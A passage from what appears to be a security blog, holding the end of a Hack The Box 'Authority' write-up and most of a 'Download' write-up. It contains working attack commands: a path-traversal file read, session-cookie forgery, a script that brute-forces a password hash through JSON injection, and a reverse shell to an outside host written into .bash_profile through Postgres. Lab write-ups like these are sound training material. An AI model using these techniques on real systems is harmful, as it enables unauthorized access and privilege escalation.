-action ldap-shell -port 636 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation # add_user_to_group svc_ldap \u0026#34;Domain Admins\u0026#34; Adding user: svc_ldap to group Domain Admins result: OK # exit Seems svc_ldap is now a part of the Domain Admins group, and hence have admin privileges.\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Domain Admins Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner ...snip... ...snip... *Evil-WinRM* PS C:\\Users\u0026gt; ls \u0026#34;C:/Users/Administrator/Desktop/\u0026#34; Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 8/6/2023 11:20 PM 34 root.txt *Evil-WinRM* PS C:\\Users\u0026gt; cat \u0026#34;C:/Users/Administrator/Desktop/root.txt\u0026#34; 40522df19c024877ca5dc612219fc9fd Alternatively, using the same script I can also change Administrator\u0026rsquo;s password.\n❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -new-pass Another option is to grant svc_ldap DCSync rights and use secretsdump.py to dump the hashes.\n❯ python passthecert.py -domain authority.htb -dc-ip 10.10.11.222 -crt certipy/admin.crt -key certipy/admin.key -target svc_ldap -elevate Pwned!\nRelated Links # GhostPack/Certify: Active Directory certificate abuse. r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack (.NET v4.0) ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse addcomputer.py - The Hacker Tools Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members Certificates and Pwnage and Patches, Oh My! | by Will Schroeder | Posts By SpecterOps Team Members Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR Help understanding limitations of \u0026ldquo;KDC_ERR_PADATA_TYPE_NBSP\u0026rdquo; · Issue #64 · ly4k/Certipy bloodyAD and Certifried (CVE-2022-26923) | Total Recall From Misconfigured Certificate Template to Domain Admin - Red Team Notes dirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS 4771(F) Kerberos pre-authentication failed. - Windows Security | Microsoft Learn Charlie Bromberg: Kerberos basics \u0026amp; (ab)use of Certificates within Active Directory (i.e. AD CS and PKINIT) - Kerberos 101 - Pass-the-Certificate - UnPAC-the-Hash - Shadow Credentials - AD CS escalation (ESC1 to ESC8) Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Blog ","date":"10 December 2023","permalink":"/blog/htb-authority/","section":"Blog Posts","summary":"Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used pass-the-cert attack to gain access as Administrator.","title":"HTB Authority"},{"content":"","date":null,"permalink":"/tags/ldap/","section":"Tags","summary":"","title":"Ldap"},{"content":"","date":null,"permalink":"/tags/passthecert/","section":"Tags","summary":"","title":"PassTheCert"},{"content":"","date":null,"permalink":"/tags/pwm/","section":"Tags","summary":"","title":"PWM"},{"content":"","date":null,"permalink":"/tags/bola/","section":"Tags","summary":"","title":"Bola"},{"content":"","date":null,"permalink":"/tags/express/","section":"Tags","summary":"","title":"Express"},{"content":"Download HTB #Overview # Download is a hard linux box on HTB which hosts an Express application with a file read vulnerability that allowed me to retrieve it\u0026rsquo;s source code. Analyzing the code unveiled issues like broken object-level authentication and a JSON injection vulnerability. Leveraging these weaknesses, I successfully brute forced a user\u0026rsquo;s password, which was reused for SSH login. Next, I found database credentials in a URI of a background process. The database granted me pg_write_server_files privileges, enabling me to write files on the system as the user \u0026ldquo;postgres\u0026rdquo;. Exploiting a cron job that interactively logs in as \u0026ldquo;postgres\u0026rdquo;, I utilized the write privileges to execute commands in the context of \u0026ldquo;postgres\u0026rdquo;. Further enumeration revealed multiple root TTY sessions, providing an opportunity to hijack them and execute commands as the root user.\nEnumeration # Open Ports #A nmap scan reveal two open ports\nport 22 → OpenSSH port 80 → Nginx web server \u0026gt; nmap -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oA nmap/10.10.11.226_fullScan 10.10.11.226 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:37 IST Nmap scan report for download.htb (10.10.11.226) Host is up (1.2s latency). Not shown: 64788 filtered tcp ports (no-response), 745 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http \u0026gt; nmap -p22,80 -sV -sC -T4 -Pn -oA nmap/10.10.11.226 10.10.11.226 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:49 IST Nmap scan report for download.htb (10.10.11.226) Host is up (0.066s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA) | 256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA) |_ 256 e6:ff:77:94:12:40:7b:06:a2:97:7a🇩🇪14:94:5b:ae (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Download.htb - Share Files With Ease |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #From analyzing the headers, the IP address redirects to the download.htb domain. Subsequently, the headers for the domain show that its using Express along with a session cookie and a corresponding signature.\n\u0026gt; http -ph 10.10.11.226 HTTP/1.1 301 Moved Permanently Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Thu, 10 Aug 2023 12:21:24 GMT Location: http://download.htb Server: nginx/1.18.0 (Ubuntu) \u0026gt; http -ph download.htb HTTP/1.1 200 OK ...snip... Server: nginx/1.18.0 (Ubuntu) Set-Cookie: download_session=...snip... Set-Cookie: download_session.sig=...snip... Transfer-Encoding: chunked X-Powered-By: Express The index page provides general information about the site\u0026rsquo;s services and includes two hyperlinks leading to the upload and login pages.\nIndex page As the name implies, the upload page allows file uploads, but access to other functions requires authentication. Fortunately, the login page conveniently provides a link to the register page. Validating a valid user is also challenging because the error message for incorrect credentials is generic\nInitial Foothold # When logging in with the newly created user, a base64-encoded download_session cookie and its corresponding cookie signature are set. This cookie also contains a JSON object representing the user.\nLogin Request \u0026gt; echo \u0026#39;eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiYWJyYXhhcyJ9fQ==\u0026#39; | base64 -d | jq { \u0026#34;flashes\u0026#34;: { \u0026#34;info\u0026#34;: [], \u0026#34;error\u0026#34;: [], \u0026#34;success\u0026#34;: [ \u0026#34;You are now logged in.\u0026#34; ] }, \u0026#34;user\u0026#34;: { \u0026#34;id\u0026#34;: 16, \u0026#34;username\u0026#34;: \u0026#34;abraxas\u0026#34; } } To test the file upload function. uploaded a white pixel image at the /files/upload upload:\nReturns a URL to view the image at /files/view/\u0026lt;d57d0db2-5d52-4f49-8edb-7073c47114a8\u0026gt;. The copy button, pops up an alert box and the link to this page is copied to the clipboard -\u0026gt; Corresponds to the copy.js is, nothing to exploit here. Download sends a GET req to /files/download/\u0026lt;d57d0db2-5d52-4f49-8edb-7073c47114a8\u0026gt;. Delete deletes the image from the server. To test the file upload function, I uploaded a white pixel image at /files/upload. The result was a URL to view the image at /files/view/\u0026lt;d57d0db2-5d52-4f49-8edb-7073c47114a8\u0026gt;. The copy button triggered an alert box and copied the link to this page to the clipboard—seems like nothing exploitable in the copy.js. Clicking the Download button sent a GET request to /files/download/\u0026lt;d57d0db2-5d52-4f49-8edb-7073c47114a8\u0026gt;. Lastly, the Delete button simply removes the image from the server.\n❯ convert -size 32x32 xc:white empty.png Download page File Read #Looking at the download request, it seems that the endpoint sends what appears to be the file UUID as a parameter, this could be potentially be vulnerable to some kind of file read.\nDownload request I experimented with various payloads to exploit the potential file read vulnerability, and the only one that worked is %2e%2e%2f (URL encoded ../). Unfortunately, I couldn\u0026rsquo;t read anything beyond the webapp\u0026rsquo;s root directory using this approach. Given that this is an Express application, the package.json file could give details about the application, including its dependencies and starting point.\n\u0026gt; http -pb http://download.htb/files/download/%2e%2e%2fpackage.json { \u0026#34;author\u0026#34;: \u0026#34;wesley\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;@prisma/client\u0026#34;: \u0026#34;^4.13.0\u0026#34;, \u0026#34;cookie-parser\u0026#34;: \u0026#34;^1.4.6\u0026#34;, \u0026#34;cookie-session\u0026#34;: \u0026#34;^2.0.0\u0026#34;, \u0026#34;express\u0026#34;: \u0026#34;^4.18.2\u0026#34;, \u0026#34;express-fileupload\u0026#34;: \u0026#34;^1.4.0\u0026#34;, \u0026#34;zod\u0026#34;: \u0026#34;^3.21.4\u0026#34; }, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/cookie-parser\u0026#34;: \u0026#34;^1.4.3\u0026#34;, \u0026#34;@types/cookie-session\u0026#34;: \u0026#34;^2.0.44\u0026#34;, \u0026#34;@types/express\u0026#34;: \u0026#34;^4.17.17\u0026#34;, \u0026#34;@types/express-fileupload\u0026#34;: \u0026#34;^1.4.1\u0026#34;, \u0026#34;@types/node\u0026#34;: \u0026#34;^18.15.12\u0026#34;, \u0026#34;@types/nunjucks\u0026#34;: \u0026#34;^3.2.2\u0026#34;, \u0026#34;nodemon\u0026#34;: \u0026#34;^2.0.22\u0026#34;, \u0026#34;nunjucks\u0026#34;: \u0026#34;^3.2.4\u0026#34;, \u0026#34;prisma\u0026#34;: \u0026#34;^4.13.0\u0026#34;, \u0026#34;ts-node\u0026#34;: \u0026#34;^10.9.1\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^5.0.4\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;app.js\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;download.htb\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;tsc\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;nodemon --exec ts-node --files ./src/app.ts\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34; } According to the package.json file:\nThe author is wesley (possible username). The application is built with TypeScript and uses Zod for schema validation. The entry point specified in the dev script is app.ts, likely indicating the presence of an app.js file in the root directory. Potentially interesting dependencies @prisma/client cookie-parser cookie-session express-fileupload App.js #Trying to access app.ts directly with /download/%2e%2e%2fsrc%2fapp.ts leads to a 404 Not Found error. However, accessing app.js reveals its source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026gt; http -pb http://download.htb/files/download/%2e%2e%2fapp.js \u0026#34;use strict\u0026#34;; var __importDefault = (this \u0026amp;\u0026amp; this.__importDefault) || function (mod) { return (mod \u0026amp;\u0026amp; mod.__esModule) ? mod : { \u0026#34;default\u0026#34;: mod }; }; Object.defineProperty(exports, \u0026#34;__esModule\u0026#34;, { value: true }); const express_1 = __importDefault(require(\u0026#34;express\u0026#34;)); const nunjucks_1 = __importDefault(require(\u0026#34;nunjucks\u0026#34;)); const path_1 = __importDefault(require(\u0026#34;path\u0026#34;)); const cookie_parser_1 = __importDefault(require(\u0026#34;cookie-parser\u0026#34;)); const cookie_session_1 = __importDefault(require(\u0026#34;cookie-session\u0026#34;)); const flash_1 = __importDefault(require(\u0026#34;./middleware/flash\u0026#34;)); const auth_1 = __importDefault(require(\u0026#34;./routers/auth\u0026#34;)); const files_1 = __importDefault(require(\u0026#34;./routers/files\u0026#34;)); const home_1 = __importDefault(require(\u0026#34;./routers/home\u0026#34;)); const client_1 = require(\u0026#34;@prisma/client\u0026#34;); const app = (0, express_1.default)(); const port = 3000; const client = new client_1.PrismaClient(); const env = nunjucks_1.default.configure(path_1.default.join(__dirname, \u0026#34;views\u0026#34;), { autoescape: true, express: app, noCache: true, }); app.use((0, cookie_session_1.default)({ name: \u0026#34;download_session\u0026#34;, keys: [\u0026#34;8929874489719802418902487651347865819634518936754\u0026#34;], maxAge: 7 * 24 * 60 * 60 * 1000, })); app.use(flash_1.default); app.use(express_1.default.urlencoded({ extended: false })); app.use((0, cookie_parser_1.default)()); app.use(\u0026#34;/static\u0026#34;, express_1.default.static(path_1.default.join(__dirname, \u0026#34;static\u0026#34;))); app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { res.render(\u0026#34;index.njk\u0026#34;); }); app.use(\u0026#34;/files\u0026#34;, files_1.default); app.use(\u0026#34;/auth\u0026#34;, auth_1.default); app.use(\u0026#34;/home\u0026#34;, home_1.default); app.use(\u0026#34;*\u0026#34;, (req, res) =\u0026gt; { res.render(\u0026#34;error.njk\u0026#34;, { statusCode: 404 }); }); app.listen(port, process.env.NODE_ENV === \u0026#34;production\u0026#34; ? \u0026#34;127.0.0.1\u0026#34; : \u0026#34;0.0.0.0\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Listening on \u0026#34;, port); if (process.env.NODE_ENV === \u0026#34;production\u0026#34;) { setTimeout(async () =\u0026gt; { await client.$executeRawUnsafe(`COPY (SELECT \u0026#34;User\u0026#34;.username, sum(\u0026#34;File\u0026#34;.size) FROM \u0026#34;User\u0026#34; INNER JOIN \u0026#34;File\u0026#34; ON \u0026#34;File\u0026#34;.\u0026#34;authorId\u0026#34; = \u0026#34;User\u0026#34;.\u0026#34;id\u0026#34; GROUP BY \u0026#34;User\u0026#34;.username) TO \u0026#39;/var/backups/fileusages.csv\u0026#39; WITH (FORMAT csv);`); }, 300000); } }); Line 16 creates an instance for the Prisma client, which is an ORM library for JavaScript. The hardcoded key for session cookies, 8929874489719802418902487651347865819634518936754 could be exploited for forging session cookies. There are also three routes referenced ./routers/auth ./routers/files ./routers/home In a production environment, the app executes a raw SQL query using Prisma. Specifically, joining the User and File tables based on the author relationship, calculating total file sizes for each user, grouping the results by username, and exporting this data to a CSV file in /var/backups/. The raw SQL queries is intriguing . COPY ( SELECT \u0026#34;User\u0026#34;.username, sum(\u0026#34;File\u0026#34;.size) FROM \u0026#34;User\u0026#34; INNER JOIN \u0026#34;File\u0026#34; ON \u0026#34;File\u0026#34;.\u0026#34;authorId\u0026#34; = \u0026#34;User\u0026#34;.\u0026#34;id\u0026#34; GROUP BY \u0026#34;User\u0026#34;.username ) TO \u0026#39;/var/backups/fileusages.csv\u0026#39; WITH (FORMAT csv); As expected, the hardcoded key is used to sign the cookies. With the knowledge from the source code, including the session cookie name (download_session) and the \u0026ldquo;secret,\u0026rdquo; I can create a crafted cookie using Cookie-Monster.\nThe middleware will parse the Cookie header on the request and expose the cookie data as the property req.cookies and, if a secret was provided, as the property req.signedCookies. These properties are name value pairs of the cookie name to cookie value.\nDownload route #routers/files.js\nrouter.get(\u0026#34;/download/:fileId\u0026#34;, async (req, res) =\u0026gt; { const fileEntry = await client.file.findFirst({ where: { id: req.params.fileId }, select: { name: true, private: true, authorId: true, }, }); if (fileEntry?.private \u0026amp;\u0026amp; req.session?.user?.id !== fileEntry.authorId) { return res.status(404); } return res.download( path_1.default.join(uploadPath, req.params.fileId), fileEntry?.name ?? \u0026#34;Unknown\u0026#34; ); }); The download endpoint in this route uses the findFirst() prism function to get file entries from the database. If there\u0026rsquo;s no entry for the given file the name property is set to unknown. Then it queries the database for the fileEntry and retrieves three properties, name, private and authorID from the database. If the private property is true or the user id doesn\u0026rsquo;t match the authorId its will return a 404. This explains why I couldn\u0026rsquo;t read files with file traversal.\nThe download endpoint in this route uses the findFirst() function from Prisma to fetch file entries from the database. If there\u0026rsquo;s no record for the given file, the name property is set to \u0026ldquo;unknown\u0026rdquo;. Subsequently, it queries the database for the fileEntry and retrieves three properties: name, private, and authorID. If the private property is true or the user ID doesn\u0026rsquo;t match the authorId, it returns a 404. This explains why file traversal didn\u0026rsquo;t work for reading files beyond the root directory.\nHome route #routers/home.js\nrouter.get(\u0026#34;/\u0026#34;, auth_1.default, async (req, res) =\u0026gt; { const files = await client.file.findMany({ where: { author: req.session.user }, select: { id: true, uploadedAt: true, size: true, name: true, private: true, authorId: true, author: { select: { username: true, }, }, In this route, multiple files for a user are fetched using Prisma\u0026rsquo;s findMany() function. The conditional is that the author parameter matches the user object from the session. This implies that I can view different users\u0026rsquo; home pages as long as I have a valid user object in the session.\nAuth route #routers/auth.js\n\u0026gt; http -pb http://download.htb/files/download/%2e%2e%2frouters%2fauth.js ...snip... const hashPassword = (password) =\u0026gt; { return node_crypto_1.default.createHash(\u0026#34;md5\u0026#34;).update(password).digest(\u0026#34;hex\u0026#34;); }; ...snip... ...snip... router.post(\u0026#34;/login\u0026#34;, async (req, res) =\u0026gt; { const user = await client.user.findFirst({ where: { username: data.username, password: hashPassword(data.password) }, }); if (!user) { res.flash(\u0026#34;error\u0026#34;, \u0026#34;That username / password combination did not exist.\u0026#34;); return res.redirect(\u0026#34;/auth/register\u0026#34;); } req.session.user = { id: user.id, username: user.username, }; res.flash(\u0026#34;success\u0026#34;, \u0026#34;You are now logged in.\u0026#34;); ...snip... Based on the source code for the authentication route, passwords are stored as MD5 hex digests, and the user object used for validation follows a similar pattern as in the previous route, dependent on Prisma\u0026rsquo;s findFirst() function.\nLogin bypass #From the login request, I know that the cookie set after logging in contains a user object with id and username parameters among other things. Furthermore, since the home route appears to rely solely on this user object, manipulating that could potentially give to the home page of authenticated users.\n\u0026#34;user\u0026#34;: { \u0026#34;id\u0026#34;: 16, \u0026#34;username\u0026#34;: \u0026#34;abraxas\u0026#34; } Since I didn\u0026rsquo;t have usernames, I tried iterating through IDs. Testing for id=1 with the user object as {\u0026quot;user\u0026quot;: {\u0026quot;id\u0026quot;:1}} and signing it using Cookie Monster, I gained access to WESLEY\u0026rsquo;s home page → BOLA.\n\u0026gt; echo \u0026#39;{\u0026#34;user\u0026#34;: {\u0026#34;id\u0026#34;:1}}\u0026#39; \u0026gt; user.json \u0026gt; ~/Tools/cookie-monster/bin/cookie-monster.js -e -f user.json -k 8929874489719802418902487651347865819634518936754 -n download_session _ _ _/0\\/ \\_ .-. .-` \\_/\\0/ \u0026#39;-. /:::\\ / ,_________, \\ /\\:::/ \\ \u0026#39;. (:::/ `\u0026#39;-; \\ `-\u0026#39;`\\ \u0026#39;._ `\u0026#34;\u0026#39;\u0026#34;\u0026#39;\\__ \\ `\u0026#39;-. \\ `)-=-=( `, | \\ `-\u0026#34;` `\u0026#34;-` / [+] Data Cookie: download_session=eyJ1c2VyIjp7ImlkIjoxfX0= [+] Signature Cookie: download_session.sig=CIdiz217BVhPMCi2PN8zK0mYK0k With the crafted cookie, I can access WESLEY\u0026rsquo;s homepage, who has two uploaded files. Unfortunately, neither file yielded valuable information, only revealing the associated username.\nWesley\u0026rsquo;s home page JSON Injection #Returning to the authentication route, the findFirst() function could be vulnerable. As the name implies, it retrieves the first record matching specified conditions. If I can inject my own user object, it has the potential to bypass validation checks. Additionally, Prisma client offers various filtering options such as contains() and startsWith(), making findFirst vulnerable to JSON Injection.\nThe username obtained through the Broken Object Level Authentication, coupled with a Prisma filter like startsWith() and a regex, I could potentially extract the password based on the response received after validation.\n{ \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: {\u0026#34;contains\u0026#34;: \u0026#34;WESLEY\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;startsWith\u0026#34;: \u0026lt;some char\u0026gt;}, } } Again a valid cookie and its signature can be generated using cookie monster, so to make the process easier I wrote a python script to automate the various steps. Since this would returns MD5 hex digest of the passwords, so the character set would be [a-f0-9].\nTo streamline the process, I created a Python script that automates the generation of a valid cookie and its signature using Cookie Monster. Since the resulting passwords are in MD5 hex digest format, the character set is limited to [a-f0-9]\nRunning this in a loop for all characters in the charset, and based on the variations in the response length I know two things\nThe first character is f The response length for a valid request is 3868 By iterating through all characters in the character set in a loop, I observed variations in response lengths. The response length for a valid request is 3868, while an invalid login produces a response length of 2175. Since the only character that returns a response length of 3868 is f, it mean that it is the first character in the password.\n\u0026gt; python cookie_injection.py Testing char: a 2175 Testing char: b 2175 Testing char: c 2175 Testing char: d 2175 Testing char: e 2175 Testing char: f 3868 Testing char: 0 2175 Testing char: 1 2175 Testing char: 2 2175 Testing char: 3 2175 Testing char: 4 2175 Testing char: 5 2175 Testing char: 6 2175 Testing char: 7 2175 Testing char: 8 2175 Testing char: 9 2175 With this updated information, I modified the script to perform the following:\nImplement an additional loop over a range of 32, considering that hex strings are consistently 32 bytes. Filter any responses that don\u0026rsquo;t match a response length of 3868 #!/usr/bin/env python import re import sys import requests import urllib3 import subprocess import os import json username = \u0026#34;\u0026#34; password = \u0026#34;\u0026#34; url = \u0026#34;http://download.htb/home/\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} charset_hex = \u0026#34;abcdef0123456789\u0026#34; # charset_hex = \u0026#34;a\u0026#34; params = {\u0026#34;name\u0026#34;: \u0026#34;value\u0026#34;} data = {\u0026#34;name\u0026#34;: \u0026#34;value\u0026#34;} try: # Hex is always 128 bits for i in range(32): for char in charset_hex: # print(f\u0026#34;Testing char: {char}\u0026#34;) temp_pass = password + char user_obj = { \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: {\u0026#34;contains\u0026#34;: \u0026#34;WESLEY\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;startsWith\u0026#34;: temp_pass}, } } with open(\u0026#34;user_obj.json\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(json.dumps(user_obj)) cmd = [ \u0026#34;/home/kali/Tools/cookie-monster/bin/cookie-monster.js\u0026#34;, \u0026#34;-e\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;user_obj.json\u0026#34;, \u0026#34;-k\u0026#34;, \u0026#34;8929874489719802418902487651347865819634518936754\u0026#34;, \u0026#34;-n\u0026#34;, \u0026#34;download_session\u0026#34;, ] cookieMonster_out = subprocess.check_output(cmd, text=True) # print(cookieMonster_out) data_cookie_pattern = r\u0026#34;Data Cookie: download_session=([^[\\]+]+)\u0026#34; signature_cookie_pattern = ( r\u0026#34;Signature Cookie: download_session\\.sig=([^[\\]+]+)\u0026#34; ) data_cookie_match = re.search(data_cookie_pattern, cookieMonster_out) signature_cookie_match = re.search( signature_cookie_pattern, cookieMonster_out ) if data_cookie_match and signature_cookie_match: session_cookie = data_cookie_match.group(1).strip() session_sig = signature_cookie_match.group(1).strip() # TODO: Why does this happen? # Remove the trailing \\x1b session_cookie = \u0026#34;\u0026#34;.join([c for c in session_cookie if c.isprintable()]) session_sig = \u0026#34;\u0026#34;.join([c for c in session_sig if c.isprintable()]) cookies = { \u0026#34;download_session\u0026#34;: session_cookie, \u0026#34;download_session.sig\u0026#34;: session_sig, } # print(cookies) response = requests.get( url=url, cookies=cookies, proxies=proxies, verify=False ) response_length = response.headers[\u0026#34;Content-Length\u0026#34;] if response_length != \u0026#34;2175\u0026#34;: print(f\u0026#34;Partial: {temp_pass}\u0026#34;) password += char break print(f\u0026#34;Final password: {password}\u0026#34;) except Exception as e: print(f\u0026#34;Exception raised: {e}\u0026#34;) When the script complete its 32 iterations, I get the Wesley\u0026rsquo;s MD5 password hash.\n\u0026gt; python cookie_injection.py Partial: f Partial: f8 Partial: f88 Partial: f889 Partial: f8897 Partial: f88976 Partial: f88976c Partial: f88976c1 Partial: f88976c10 Partial: f88976c10a Partial: f88976c10af Partial: f88976c10af6 Partial: f88976c10af66 Partial: f88976c10af669 Partial: f88976c10af6691 Partial: f88976c10af66915 Partial: f88976c10af669159 Partial: f88976c10af6691591 Partial: f88976c10af66915918 Partial: f88976c10af669159189 Partial: f88976c10af6691591894 Partial: f88976c10af66915918945 Partial: f88976c10af66915918945b Partial: f88976c10af66915918945b9 Partial: f88976c10af66915918945b96 Partial: f88976c10af66915918945b967 Partial: f88976c10af66915918945b9679 Partial: f88976c10af66915918945b9679b Partial: f88976c10af66915918945b9679b2 Partial: f88976c10af66915918945b9679b2b Partial: f88976c10af66915918945b9679b2bd Partial: f88976c10af66915918945b9679b2bd3 Final password: f88976c10af66915918945b9679b2bd3 The MD5 hash can be cracked to get the actual password → dunkindonuts.\n\u0026gt; sth --no-banner -t \u0026#39;f88976c10af66915918945b9679b2bd3\u0026#39; f88976c10af66915918945b9679b2bd3 Text : dunkindonuts Type : MD5 Wesley\u0026rsquo;s login credentials seem to be reused for SSH access.\n\u0026gt; pc wesley:dunkindonuts@download.htb [03:02:22] Welcome to pwncat 🐈! [03:02:24] download.htb:22: registered new host w/ db (local) pwncat$ (remote) wesley@download:/home/wesley$ id uid=1000(wesley) gid=1000(wesley) groups=1000(wesley) Privilege Escalation to root # Unfortunately, wesley does not have any sudo privileges on the system.\n(remote) wesley@download:/home/wesley$ sudo -l [sudo] password for wesley: Sorry, user wesley may not run sudo on download. The existence of a .psql_history file in the home directory indicates that a Postgres database is being used.\n(remote) wesley@download:/home/wesley$ ls -la total 44 ...snip... lrwxrwxrwx 1 root root 9 Apr 21 14:33 .psql_history -\u0026gt; /dev/null drwx------ 2 wesley wesley 4096 Aug 10 19:31 .ssh -rw-r----- 1 root wesley 33 Aug 10 19:12 user.txt -rw-r--r-- 1 wesley wesley 39 Jul 17 11:58 .vimrc The postgres user confirms the existence of the database, and is most likely used to manage it.\n(remote) wesley@download:/home/wesley$ cat /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash wesley❌1000:1000:wesley:/home/wesley:/bin/bash postgres❌113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash While searching for running postgres processes, I discovered one with a URI that includes both the user and password: download:CoconutPineappleWatermelon.\n(remote) wesley@download:/home/wesley$ ss -antlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* LISTEN 0 244 127.0.0.1:5432 0.0.0.0:* LISTEN 0 511 0.0.0.0:80 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* (remote) wesley@download:/home/wesley$ ps aux | grep 5432 wesley 1841 0.0 0.3 24928 13384 pts/3 S+ 19:16 0:00 /usr/lib/postgresql/12/bin/psql postgresql://download:CoconutPineappleWatermelon@localhost:5432/download The presence of the URI in a running was peculiar, so used pspy to investigate further. Its seems there\u0026rsquo;s a cron job to login interactively as postgres.\n2023/08/10 22:08:10 CMD: UID=0 PID=2475 | su -l postgres RCE as postgres #Successfully logged into the download Postgres database using psql.\n(remote) wesley@download:/home/wesley$ psql -h localhost -U download -W download Password: psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1)) SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off) Type \u0026#34;help\u0026#34; for help. download=\u0026gt; The user possesses pg_write_server_files privileges, allowing me to write to files as the user running Postgres through Postgres queries.\ndownload=\u0026gt; Select user; user ---------- download (1 row) download=\u0026gt; \\du List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+------------------------- download | | {pg_write_server_files} postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} download=\u0026gt; For interactive logins, the .bash_profile, .profile, and .bashrc files are executed to configure the environment. Since root logs in interactively as the postgres user, these files will execute within the postgres user\u0026rsquo;s context. Therefore, I can execute commands as the postgres user, using the database attributes. Any commands added to these files will be executed when root logs in interactively.\ndownload=\u0026gt; copy (select \u0026#39;I am postgres\u0026#39; ) to \u0026#39;/tmp/postgres_exec_test\u0026#39;; COPY 1 download=\u0026gt; exit (remote) wesley@download:/home/wesley$ cat /tmp/postgres_exec_test I am postgres Similarly, I can add a reverse shell payload to get a shell as the postgres user.\ndownload=\u0026gt; copy (select \u0026#39;/bin/sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.42/9005 0\u0026gt;\u0026amp;1\u0026#39; ) to \u0026#39;/var/lib/postgresql/.bash_profile\u0026#39;; COPY 1 I successfully got a shell as the postgres user. However, it appears that even an upgraded shell terminates quickly, likely due to the interactive login ending.\n(remote) postgres@download:/var/lib/postgresql$ bash: [1993: 2 (255)] tcsetattr: Input/output error Hangup To get a stable shell, I injected SSH keys into postgres\u0026rsquo; ssh directory. That said, I found nothing to escalate.\n(remote) postgres@download:/var/lib/postgresql$ id uid=113(postgres) gid=118(postgres) groups=118(postgres),117(ssl-cert) (remote) postgres@download:/var/lib/postgresql$ find / -group ssl-cert 2\u0026gt;/dev/null /etc/ssl/private (remote) postgres@download:/var/lib/postgresql$ ls -la /etc/ssl/private ls: cannot open directory \u0026#39;/etc/ssl/private\u0026#39;: Permission denied (remote) postgres@download:/var/lib/postgresql$ ls -ld 